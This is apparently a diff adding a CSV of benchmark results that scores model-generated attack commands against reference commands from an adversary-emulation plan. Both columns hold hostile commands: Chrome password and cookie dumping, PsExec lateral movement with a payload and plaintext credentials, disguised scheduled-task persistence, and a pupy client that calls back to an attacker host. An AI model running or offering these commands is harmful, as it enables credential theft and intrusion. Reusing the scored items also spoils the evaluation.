@@ -1,0 +1,21 @@
+file,tool,input_command,matched_command,chrf_score,match_found
+command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords.exe,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",72.548,True
+command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords.exe -p > output.txt,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",52.861,True
+command_chrome_passwords_TA0002_T1059.txt,chrome passwords,"chrome-passwords.exe -c > cookies.txt && echo ""const passwords = [];"" >> password.js && echo ""const cookies = []; let i = 0;"" >> password.js && while IFS=$'\n' read -r line; do echo ""cookies.push({ host_key: '$line', path: '', cookie_value: '' });"" >> password.js; done < cookies.txt","[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",11.336,True
+command_chrome_passwords_TA0002_T1059.txt,chrome passwords,node.exe password.js,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",31.893,True
+command_psexec_TA0002_T1053.txt,psexec,"psexec \\%computername% -u <user> -n s -a n,n,... cmd /c powershell -file <powershell_script_file_path>","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",21.512,True
+command_psexec_TA0002_T1053.txt,psexec,"psexec \\%computername% -u <user> -n s -a n,n,... cmd /c start <javascript_code_file_name>.js","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",18.916,True
+command_psexec_TA0002_T1053.txt,psexec,"psexec \\%computername% -u <user> -n s -a n,n,... -l -d -h cmd /c taskkill /f /im AdobeFlashSync.exe & psexec \\%computername% -u <user> -n s -a n,n,... -l -d -h cmd /c schtasks /create /tn AdobeFlashSync /tr ""powershell -file <powershell_script_file_path>"" /st <schedule_time>","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",15.438,True
+command_psexec_TA0003_T1053.txt,psexec,"psexec \\<victim_computer> -u <user_name> -c -a 1,2 cmd /c powershell.exe -File <powershell_script_path>","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",26.232,True
+command_psexec_TA0004_T1053.txt,psexec,"psexec \\<target_computer> -u <user_name> -n <timeout> -l -c -a <cpu_cores> cmd /c ""powershell -ExecutionPolicy Bypass -File <script_path>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",20.182,True
+command_psexec_TA0004_T1053.txt,psexec,"psexec \\<target_computer> -u <user_name> -n <timeout> -h -a <cpu_cores> cmd /c ""schtasks /create /tn AdobeFlashSync /tr '<command_line>' /st <start_time>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",16.743,True
+command_pupy_TA0004_T1055.txt,pupy,"py -c ""import subprocess;subprocess.call([r'C:\\Windows\\System32\\calc.exe'])""",`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,12.143,True
+command_pupy_TA0004_T1055.txt,pupy,download 'C:\\Windows\\System32\\calc.exe',"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",21.714,True
+command_pupy_TA0004_T1055.txt,pupy,shell_exec 'CreateThread',`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,9.195,True
+command_pupy_TA0004_T1055.txt,pupy,"pexec -c ""import ctypes;ctypes.windll.kernel32.CreateThread""",`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,13.749,True
